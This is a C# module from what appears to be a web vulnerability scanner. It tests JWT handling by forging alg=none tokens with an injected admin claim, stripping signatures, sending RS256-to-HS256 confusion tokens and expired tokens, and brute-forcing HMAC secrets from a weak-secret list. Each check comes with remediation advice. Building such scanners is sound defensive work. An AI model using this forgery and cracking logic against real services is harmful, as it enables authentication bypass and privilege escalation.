using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Raqeeb.Domain.Entities;
using Raqeeb.Domain.Interfaces;
using Raqeeb.Domain.Scanning;

namespace Raqeeb.Infrastructure.Scanning.Modules;

/// <summary>
/// Detects JSON Web Token (JWT) security vulnerabilities including:
/// - Algorithm confusion (alg: none, RS256?HS256)
/// - Signature tampering and stripping
/// - Weak HMAC secrets (brute-force common keys)
/// - Expired token acceptance
/// - JWT exposure in URLs (Referer leak risk)
/// - Missing signature verification
/// </summary>
public class JwtSecurityScanner : IScannerModule
{
    public string Name => "JwtSecurityScanner";
    public string Description => "Detects JWT security misconfigurations: alg:none bypass, weak secrets, algorithm confusion, signature bypass, expired token acceptance.";

    // ?? JWT pattern: three base64url segments separated by dots ?????????????
    private static readonly Regex JwtPattern = new(
        @"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*",
        RegexOptions.Compiled);

    // ?? Common weak HMAC secrets found in real-world breaches ???????????????
    private static readonly string[] WeakSecrets =
    [
        "secret",
        "Secret",
        "SECRET",
        "password",
        "12345",
        "123456",
        "qwerty",
        "abc123",
        "your-256-bit-secret",
        "your-secret-key",
        "mysecretkey",
        "jwt-secret",
        "ChangeMe",
        "changeme",
        "default",
        "admin",
        "test",
        "dev",
        "development",
        "production",
        "",  // empty string
    ];

    // ????????????????????????????????????????????????????????????????????????
    //  Entry point
    // ????????????????????????????????????????????????????????????????????????

    public async Task<IEnumerable<Vulnerability>> ScanAsync(ScanContext context)
    {
        var vulnerabilities = new List<Vulnerability>();

        try
        {
            // 1. Extract JWTs from the application (headers, cookies, URLs)
            var tokens = await DiscoverJwtsAsync(context);

            if (tokens.Count == 0)
            {
                // No JWTs found — nothing to test
                return vulnerabilities;
            }

            // 2. Test each discovered token for vulnerabilities
            foreach (var tokenInfo in tokens.Take(5))
            {
                // ?? Parse the JWT ???????????????????????????????????????????
                if (!TryParseJwt(tokenInfo.Token, out var header, out var payload, out var signature))
                    continue;

                // ?? Algorithm confusion: alg=none ???????????????????????????
                var noneVuln = await TestAlgNoneBypassAsync(context, tokenInfo, header, payload);
                if (noneVuln != null) vulnerabilities.Add(noneVuln);

                // ?? Signature stripping ?????????????????????????????????????
                var stripVuln = await TestSignatureStrippingAsync(context, tokenInfo, header, payload);
                if (stripVuln != null) vulnerabilities.Add(stripVuln);

                // ?? Weak HMAC secret brute-force ????????????????????????????
                var weakVuln = await TestWeakHmacSecretAsync(context, tokenInfo, header, payload, signature);
                if (weakVuln != null) vulnerabilities.Add(weakVuln);

                // ?? Algorithm confusion: RS256 ? HS256 ??????????????????????
                var confusionVuln = await TestAlgorithmConfusionAsync(context, tokenInfo, header, payload);
                if (confusionVuln != null) vulnerabilities.Add(confusionVuln);

                // ?? Expired token acceptance ????????????????????????????????
                var expiredVuln = await TestExpiredTokenAsync(context, tokenInfo, header, payload);
                if (expiredVuln != null) vulnerabilities.Add(expiredVuln);

                // ?? JWT in URL (Referer leak) ???????????????????????????????
                if (tokenInfo.Location == "URL")
                {
                    vulnerabilities.Add(BuildJwtInUrlVulnerability(tokenInfo));
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"JWT Security Scanner error: {ex.Message}");
        }

        return vulnerabilities;
    }

    // ????????????????????????????????????????????????????????????????????????
    //  JWT discovery
    // ????????????????????????????????????????????????????????????????????????

    private async Task<List<JwtTokenInfo>> DiscoverJwtsAsync(ScanContext context)
    {
        var tokens = new HashSet<JwtTokenInfo>();

        try
        {
            // Fetch the target URL
            var response = await context.HttpClient.GetAsync(context.Target.Url);

            // ?? Extract from Authorization header ???????????????????????????
            if (response.RequestMessage?.Headers.Authorization != null)
            {
                var authValue = response.RequestMessage.Headers.Authorization.ToString();
                var match = JwtPattern.Match(authValue);
                if (match.Success)
                {
                    tokens.Add(new JwtTokenInfo
                    {
                        Token = match.Value,
                        Location = "Authorization header",
                        Url = context.Target.Url
                    });
                }
            }

            // ?? Extract from cookies ????????????????????????????????????????
            if (response.Headers.TryGetValues("Set-Cookie", out var cookies))
            {
                foreach (var cookie in cookies)
                {
                    var match = JwtPattern.Match(cookie);
                    if (match.Success)
                    {
                        tokens.Add(new JwtTokenInfo
                        {
                            Token = match.Value,
                            Location = "Cookie",
                            Url = context.Target.Url
                        });
                    }
                }
            }

            // ?? Extract from response body (in case of login/API responses) ?
            var body = await response.Content.ReadAsStringAsync();
            var bodyMatches = JwtPattern.Matches(body);
            foreach (Match m in bodyMatches)
            {
                tokens.Add(new JwtTokenInfo
                {
                    Token = m.Value,
                    Location = "Response body",
                    Url = context.Target.Url
                });
            }

            // ?? Extract from URL query strings ??????????????????????????????
            foreach (var url in context.DiscoveredUrls.Take(20))
            {
                var urlMatch = JwtPattern.Match(url);
                if (urlMatch.Success)
                {
                    tokens.Add(new JwtTokenInfo
                    {
                        Token = urlMatch.Value,
                        Location = "URL",
                        Url = url
                    });
                }
            }
        }
        catch
        {
            // Continue
        }

        return tokens.ToList();
    }

    // ????????????????????????????????????????????????????????????????????????
    //  JWT parsing
    // ????????????????????????????????????????????????????????????????????????

    private static bool TryParseJwt(string token, out JsonDocument? header, out JsonDocument? payload, out string signature)
    {
        header = null;
        payload = null;
        signature = string.Empty;

        try
        {
            var parts = token.Split('.');
            if (parts.Length != 3)
                return false;

            var headerJson = Base64UrlDecode(parts[0]);
            var payloadJson = Base64UrlDecode(parts[1]);
            signature = parts[2];

            header = JsonDocument.Parse(headerJson);
            payload = JsonDocument.Parse(payloadJson);
            return true;
        }
        catch
        {
            return false;
        }
    }

    // ????????????????????????????????????????????????????????????????????????
    //  Attack 1: alg=none bypass
    // ????????????????????????????????????????????????????????????????????????

    private async Task<Vulnerability?> TestAlgNoneBypassAsync(
        ScanContext context, JwtTokenInfo tokenInfo, JsonDocument header, JsonDocument payload)
    {
        try
        {
            // Rebuild header with alg=none
            var noneHeader = new { alg = "none", typ = "JWT" };
            var noneHeaderJson = JsonSerializer.Serialize(noneHeader);
            var noneHeaderB64 = Base64UrlEncode(noneHeaderJson);

            // Keep original payload but tamper with a claim (e.g., set admin=true or change username)
            var payloadObj = JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(payload.RootElement.GetRawText());
            if (payloadObj == null) return null;

            // Tamper: try to escalate privileges
            payloadObj["admin"] = JsonDocument.Parse("true").RootElement;
            var tamperedPayloadJson = JsonSerializer.Serialize(payloadObj);
            var tamperedPayloadB64 = Base64UrlEncode(tamperedPayloadJson);

            // Build JWT with alg=none and empty signature
            var noneToken = $"{noneHeaderB64}.{tamperedPayloadB64}.";

            // Re-send the request with the tampered token
            if (await SendTokenAndCheckAcceptanceAsync(context, tokenInfo.Url, noneToken))
            {
                return new Vulnerability
                {
                    Name = "JWT Algorithm Confusion — alg=none Bypass",
                    Description = "The application accepts JWTs with 'alg: none' and an empty signature. " +
                                  "An attacker can forge arbitrary tokens by setting the algorithm to 'none' " +
                                  "and removing the signature, bypassing authentication/authorization checks.",
                    Severity = Severity.Critical,
                    Evidence = $"Original token location: {tokenInfo.Location}\n" +
                               $"Tampered header: {noneHeaderJson}\n" +
                               $"Tampered payload: {tamperedPayloadJson}\n" +
                               $"Server accepted the unsigned token.",
                    Remediation = "Reject tokens with 'alg: none'. Explicitly validate that the algorithm " +
                                  "matches your server's expected algorithm (e.g., HS256, RS256). In .NET, use " +
                                  "Microsoft.IdentityModel.Tokens with strict ValidateIssuerSigningKey=true.",
                    Url = tokenInfo.Url,
                    AffectedParameter = tokenInfo.Location,
                    HttpRequest = $"GET {tokenInfo.Url} HTTP/1.1\nAuthorization: Bearer {noneToken}",
                    HttpResponse = "HTTP/1.1 200 OK\n[Server accepted the token]",
                    ModuleName = Name,
                    OwaspCategory = "A07:2021 - Identification and Authentication Failures",
                    CweId = "CWE-287",
                    CvssScore = "9.8",
                    References = "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/," +
                                 "https://cwe.mitre.org/data/definitions/287.html," +
                                 "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"
                };
            }
        }
        catch
        {
            // Continue
        }

        return null;
    }

    // ????????????????????????????????????????????????????????????????????????
    //  Attack 2: Signature stripping
    // ????????????????????????????????????????????????????????????????????????

    private async Task<Vulnerability?> TestSignatureStrippingAsync(
        ScanContext context, JwtTokenInfo tokenInfo, JsonDocument header, JsonDocument payload)
    {
        try
        {
            // Keep original header/payload but remove the signature entirely
            var parts = tokenInfo.Token.Split('.');
            var strippedToken = $"{parts[0]}.{parts[1]}.";

            if (await SendTokenAndCheckAcceptanceAsync(context, tokenInfo.Url, strippedToken))
            {
                var headerJson = Base64UrlDecode(parts[0]);
                var payloadJson = Base64UrlDecode(parts[1]);

                return new Vulnerability
                {
                    Name = "JWT Signature Bypass — Missing Signature Verification",
                    Description = "The application accepts JWTs without validating the signature. " +
                                  "An attacker can tamper with the payload and remove the signature, " +
                                  "and the server will still trust the token.",
                    Severity = Severity.Critical,
                    Evidence = $"Original token location: {tokenInfo.Location}\n" +
                               $"Removed signature from token\n" +
                               $"Header: {headerJson}\n" +
                               $"Payload: {payloadJson}\n" +
                               $"Server accepted the unsigned token.",
                    Remediation = "Always validate the JWT signature. In .NET: set ValidateIssuerSigningKey=true " +
                                  "in TokenValidationParameters. Never decode and trust JWT payloads without " +
                                  "cryptographic verification.",
                    Url = tokenInfo.Url,
                    AffectedParameter = tokenInfo.Location,
                    HttpRequest = $"GET {tokenInfo.Url} HTTP/1.1\nAuthorization: Bearer {strippedToken}",
                    HttpResponse = "HTTP/1.1 200 OK\n[Server accepted the unsigned token]",
                    ModuleName = Name,
                    OwaspCategory = "A07:2021 - Identification and Authentication Failures",
                    CweId = "CWE-347",
                    CvssScore = "9.8",
                    References = "https://cwe.mitre.org/data/definitions/347.html," +
                                 "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"
                };
            }
        }
        catch
        {
            // Continue
        }

        return null;
    }

    // ????????????????????????????????????????????????????????????????????????
    //  Attack 3: Weak HMAC secret brute-force
    // ????????????????????????????????????????????????????????????????????????

    private async Task<Vulnerability?> TestWeakHmacSecretAsync(
        ScanContext context, JwtTokenInfo tokenInfo, JsonDocument header, JsonDocument payload, string signature)
    {
        try
        {
            // Only test if the algorithm is HS256/HS384/HS512
            var alg = header.RootElement.GetProperty("alg").GetString();
            if (alg == null || !alg.StartsWith("HS", StringComparison.OrdinalIgnoreCase))
                return null;

            var parts = tokenInfo.Token.Split('.');
            var message = $"{parts[0]}.{parts[1]}";

            // Try common weak secrets
            foreach (var secret in WeakSecrets.Take(15))
            {
                var computedSig = alg.ToUpperInvariant() switch
                {
                    "HS256" => ComputeHmacSha256(message, secret),
                    "HS384" => ComputeHmacSha384(message, secret),
                    "HS512" => ComputeHmacSha512(message, secret),
                    _ => null
                };

                if (computedSig != null && computedSig == signature)
                {
                    return new Vulnerability
                    {
                        Name = "JWT Weak HMAC Secret",
                        Description = $"The JWT is signed with a weak HMAC secret that can be brute-forced. " +
                                      $"The scanner cracked the secret as: '{secret}'. An attacker can forge " +
                                      $"arbitrary tokens with this secret.",
                        Severity = Severity.Critical,
                        Evidence = $"Algorithm: {alg}\n" +
                                   $"Cracked secret: {secret}\n" +
                                   $"Token location: {tokenInfo.Location}\n" +
                                   $"Original signature: {signature}\n" +
                                   $"Computed signature: {computedSig}",
                        Remediation = "Use a cryptographically strong secret (at least 256 bits of entropy for HS256). " +
                                      "Generate secrets with a CSPRNG (e.g., RandomNumberGenerator.GetBytes). " +
                                      "Store secrets in Azure Key Vault / AWS Secrets Manager. Consider using RS256 " +
                                      "(asymmetric) instead of HS256 to avoid shared-secret risks.",
                        Url = tokenInfo.Url,
                        AffectedParameter = tokenInfo.Location,
                        HttpRequest = $"Original JWT in {tokenInfo.Location}",
                        HttpResponse = $"Signature matched with weak secret: {secret}",
                        ModuleName = Name,
                        OwaspCategory = "A02:2021 - Cryptographic Failures",
                        CweId = "CWE-326",
                        CvssScore = "9.1",
                        References = "https://cwe.mitre.org/data/definitions/326.html," +
                                     "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/"
                    };
                }
            }
        }
        catch
        {
            // Continue
        }

        return null;
    }

    // ????????????????????????????????????????????????????????????????????????
    //  Attack 4: Algorithm confusion (RS256 ? HS256)
    // ????????????????????????????????????????????????????????????????????????

    private async Task<Vulnerability?> TestAlgorithmConfusionAsync(
        ScanContext context, JwtTokenInfo tokenInfo, JsonDocument header, JsonDocument payload)
    {
        try
        {
            var alg = header.RootElement.GetProperty("alg").GetString();
            if (alg == null || !alg.Equals("RS256", StringComparison.OrdinalIgnoreCase))
                return null;

            // Attempt: change alg to HS256 and sign with the server's public key
            // This exploits a vulnerability where the server uses the public key
            // as the HMAC secret when it sees alg=HS256 instead of verifying
            // the RSA signature.

            // We don't have the public key in a passive scan, but we can try
            // a generic approach: change alg to HS256 and re-sign with empty key
            var confusedHeader = new { alg = "HS256", typ = "JWT" };
            var confusedHeaderJson = JsonSerializer.Serialize(confusedHeader);
            var confusedHeaderB64 = Base64UrlEncode(confusedHeaderJson);

            var parts = tokenInfo.Token.Split('.');
            var message = $"{confusedHeaderB64}.{parts[1]}";

            // Sign with empty key (some vulnerable implementations accept this)
            var confusedSig = ComputeHmacSha256(message, "");
            var confusedToken = $"{message}.{confusedSig}";

            if (await SendTokenAndCheckAcceptanceAsync(context, tokenInfo.Url, confusedToken))
            {
                return new Vulnerability
                {
                    Name = "JWT Algorithm Confusion — RS256 to HS256",
                    Description = "The application is vulnerable to algorithm confusion. It accepted a token " +
                                  "originally signed with RS256 (asymmetric) after changing the algorithm to HS256 " +
                                  "(symmetric). This allows an attacker to forge tokens by signing with the server's " +
                                  "public key (which is not secret) as an HMAC key.",
                    Severity = Severity.Critical,
                    Evidence = $"Original algorithm: RS256\n" +
                               $"Tampered algorithm: HS256\n" +
                               $"Token location: {tokenInfo.Location}\n" +
                               $"Server accepted the algorithm-confused token.",
                    Remediation = "Explicitly validate the algorithm in the JWT header. Never allow the client " +
                                  "to choose the algorithm. In .NET: set ValidAlgorithms explicitly in " +
                                  "TokenValidationParameters (e.g., [SecurityAlgorithms.RsaSha256]). " +
                                  "Reject HS256 if you only use RS256.",
                    Url = tokenInfo.Url,
                    AffectedParameter = tokenInfo.Location,
                    HttpRequest = $"GET {tokenInfo.Url} HTTP/1.1\nAuthorization: Bearer {confusedToken}",
                    HttpResponse = "HTTP/1.1 200 OK\n[Server accepted the algorithm-confused token]",
                    ModuleName = Name,
                    OwaspCategory = "A07:2021 - Identification and Authentication Failures",
                    CweId = "CWE-327",
                    CvssScore = "9.8",
                    References = "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/," +
                                 "https://cwe.mitre.org/data/definitions/327.html"
                };
            }
        }
        catch
        {
            // Continue
        }

        return null;
    }

    // ????????????????????????????????????????????????????????????????????????
    //  Attack 5: Expired token acceptance
    // ????????????????????????????????????????????????????????????????????????

    private async Task<Vulnerability?> TestExpiredTokenAsync(
        ScanContext context, JwtTokenInfo tokenInfo, JsonDocument header, JsonDocument payload)
    {
        try
        {
            // Check if the token has an 'exp' claim
            if (!payload.RootElement.TryGetProperty("exp", out var expElement))
                return null;

            var exp = expElement.GetInt64();
            var expDate = DateTimeOffset.FromUnixTimeSeconds(exp);
            var now = DateTimeOffset.UtcNow;

            // If the token is already expired, test if the server still accepts it
            if (expDate < now)
            {
                if (await SendTokenAndCheckAcceptanceAsync(context, tokenInfo.Url, tokenInfo.Token))
                {
                    var expiredMinutes = (now - expDate).TotalMinutes;

                    return new Vulnerability
                    {
                        Name = "JWT Expired Token Accepted",
                        Description = "The application accepts JWTs that have expired. The 'exp' claim is not " +
                                      "being validated. An attacker can reuse old tokens indefinitely or extend " +
                                      "the lifetime of compromised tokens.",
                        Severity = Severity.High,
                        Evidence = $"Token expired at: {expDate:yyyy-MM-dd HH:mm:ss UTC}\n" +
                                   $"Current time: {now:yyyy-MM-dd HH:mm:ss UTC}\n" +
                                   $"Expired by: {expiredMinutes:F0} minutes\n" +
                                   $"Token location: {tokenInfo.Location}\n" +
                                   $"Server accepted the expired token.",
                        Remediation = "Validate the 'exp' claim. In .NET: set ValidateLifetime=true in " +
                                      "TokenValidationParameters. Implement token revocation/blacklisting for " +
                                      "logout scenarios. Use short-lived access tokens (5-15 minutes) with refresh tokens.",
                        Url = tokenInfo.Url,
                        AffectedParameter = tokenInfo.Location,
                        HttpRequest = $"GET {tokenInfo.Url} HTTP/1.1\nAuthorization: Bearer {tokenInfo.Token}",
                        HttpResponse = "HTTP/1.1 200 OK\n[Server accepted the expired token]",
                        ModuleName = Name,
                        OwaspCategory = "A07:2021 - Identification and Authentication Failures",
                        CweId = "CWE-613",
                        CvssScore = "7.5",
                        References = "https://cwe.mitre.org/data/definitions/613.html," +
                                     "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"
                    };
                }
            }
            else
            {
                // Token is not yet expired — create an expired variant and test
                var payloadObj = JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(payload.RootElement.GetRawText());
                if (payloadObj == null) return null;

                // Set exp to 1 hour ago
                var pastExp = DateTimeOffset.UtcNow.AddHours(-1).ToUnixTimeSeconds();
                payloadObj["exp"] = JsonDocument.Parse(pastExp.ToString()).RootElement;

                var expiredPayloadJson = JsonSerializer.Serialize(payloadObj);
                var expiredPayloadB64 = Base64UrlEncode(expiredPayloadJson);

                var parts = tokenInfo.Token.Split('.');
                // Re-sign with original signature (won't match, but we're testing if server checks exp at all)
                var expiredToken = $"{parts[0]}.{expiredPayloadB64}.{parts[2]}";

                if (await SendTokenAndCheckAcceptanceAsync(context, tokenInfo.Url, expiredToken))
                {
                    return new Vulnerability
                    {
                        Name = "JWT Expired Token Accepted (Tampered)",
                        Description = "The application does not validate the 'exp' claim. The scanner created " +
                                      "a token with an expired timestamp and the server accepted it (even though " +
                                      "the signature is invalid, indicating no signature validation either).",
                        Severity = Severity.Critical,
                        Evidence = $"Tampered exp claim: {pastExp} ({DateTimeOffset.FromUnixTimeSeconds(pastExp):yyyy-MM-dd HH:mm:ss UTC})\n" +
                                   $"Current time: {now:yyyy-MM-dd HH:mm:ss UTC}\n" +
                                   $"Server accepted the tampered expired token.",
                        Remediation = "Validate both the signature and the 'exp' claim. Set ValidateLifetime=true " +
                                      "and ValidateIssuerSigningKey=true in TokenValidationParameters.",
                        Url = tokenInfo.Url,
                        AffectedParameter = tokenInfo.Location,
                        HttpRequest = $"GET {tokenInfo.Url} HTTP/1.1\nAuthorization: Bearer {expiredToken}",
                        HttpResponse = "HTTP/1.1 200 OK",
                        ModuleName = Name,
                        OwaspCategory = "A07:2021 - Identification and Authentication Failures",
                        CweId = "CWE-613",
                        CvssScore = "9.8",
                        References = "https://cwe.mitre.org/data/definitions/613.html"
                    };
                }
            }
        }
        catch
        {
            // Continue
        }

        return null;
    }

    // ????????????????????????????????????????????????????????????????????????
    //  Attack 6: JWT in URL (Referer leak)
    // ????????????????????????????????????????????????????????????????????????

    private static Vulnerability BuildJwtInUrlVulnerability(JwtTokenInfo tokenInfo)
    {
        return new Vulnerability
        {
            Name = "JWT Token Exposed in URL",
            Description = "A JWT is being transmitted in the URL query string or path. This exposes the token " +
                          "to multiple risks: (1) Leakage via Referer header when clicking external links, " +
                          "(2) Logging in web server access logs, (3) Browser history persistence, " +
                          "(4) Shoulder-surfing.",
            Severity = Severity.Medium,
            Evidence = $"JWT found in URL: {tokenInfo.Url}\n" +
                       $"Token: {MaskToken(tokenInfo.Token)}",
            Remediation = "Transmit JWTs in the Authorization header (Bearer scheme) or in HttpOnly cookies. " +
                          "Never place tokens in URLs. If using cookies, set HttpOnly, Secure, and SameSite flags.",
            Url = tokenInfo.Url,
            AffectedParameter = "URL query string",
            ModuleName = "JwtSecurityScanner",
            OwaspCategory = "A04:2021 - Insecure Design",
            CweId = "CWE-598",
            CvssScore = "5.3",
            References = "https://cwe.mitre.org/data/definitions/598.html," +
                         "https://owasp.org/Top10/A04_2021-Insecure_Design/"
        };
    }

    // ????????????????????????????????????????????????????????????????????????
    //  HTTP probe helper
    // ????????????????????????????????????????????????????????????????????????

    /// <summary>
    /// Sends an HTTP request with the given JWT in the Authorization header
    /// and returns true if the server responds with 200 OK (indicating acceptance).
    /// </summary>
    private static async Task<bool> SendTokenAndCheckAcceptanceAsync(
        ScanContext context, string url, string token)
    {
        try
        {
            var request = new HttpRequestMessage(HttpMethod.Get, url);
            request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);

            var response = await context.HttpClient.SendAsync(request);

            // 200 OK indicates the server accepted the token
            // 401 Unauthorized indicates the server rejected it
            // 403 Forbidden might mean the token is valid but lacks permissions
            return response.StatusCode == System.Net.HttpStatusCode.OK;
        }
        catch
        {
            return false;
        }
    }

    // ????????????????????????????????????????????????????????????????????????
    //  Cryptographic helpers
    // ????????????????????????????????????????????????????????????????????????

    private static string ComputeHmacSha256(string message, string secret)
    {
        var keyBytes = Encoding.UTF8.GetBytes(secret);
        var messageBytes = Encoding.UTF8.GetBytes(message);
        using var hmac = new HMACSHA256(keyBytes);
        var hash = hmac.ComputeHash(messageBytes);
        return Base64UrlEncode(hash);
    }

    private static string ComputeHmacSha384(string message, string secret)
    {
        var keyBytes = Encoding.UTF8.GetBytes(secret);
        var messageBytes = Encoding.UTF8.GetBytes(message);
        using var hmac = new HMACSHA384(keyBytes);
        var hash = hmac.ComputeHash(messageBytes);
        return Base64UrlEncode(hash);
    }

    private static string ComputeHmacSha512(string message, string secret)
    {
        var keyBytes = Encoding.UTF8.GetBytes(secret);
        var messageBytes = Encoding.UTF8.GetBytes(message);
        using var hmac = new HMACSHA512(keyBytes);
        var hash = hmac.ComputeHash(messageBytes);
        return Base64UrlEncode(hash);
    }

    // ????????????????????????????????????????????????????????????????????????
    //  Base64Url encoding/decoding
    // ????????????????????????????????????????????????????????????????????????

    private static string Base64UrlEncode(string input)
    {
        var bytes = Encoding.UTF8.GetBytes(input);
        return Base64UrlEncode(bytes);
    }

    private static string Base64UrlEncode(byte[] bytes)
    {
        var base64 = Convert.ToBase64String(bytes);
        return base64.Replace('+', '-').Replace('/', '_').TrimEnd('=');
    }

    private static string Base64UrlDecode(string input)
    {
        var base64 = input.Replace('-', '+').Replace('_', '/');
        switch (base64.Length % 4)
        {
            case 2: base64 += "=="; break;
            case 3: base64 += "="; break;
        }
        var bytes = Convert.FromBase64String(base64);
        return Encoding.UTF8.GetString(bytes);
    }

    private static string MaskToken(string token)
    {
        if (token.Length <= 20)
            return token;
        return token[..10] + "..." + token[^10..];
    }

    // ????????????????????????????????????????????????????????????????????????
    //  Data classes
    // ????????????????????????????????????????????????????????????????????????

    private class JwtTokenInfo
    {
        public string Token { get; set; } = string.Empty;
        public string Location { get; set; } = string.Empty;  // "Authorization header", "Cookie", "URL", "Response body"
        public string Url { get; set; } = string.Empty;
    }
}
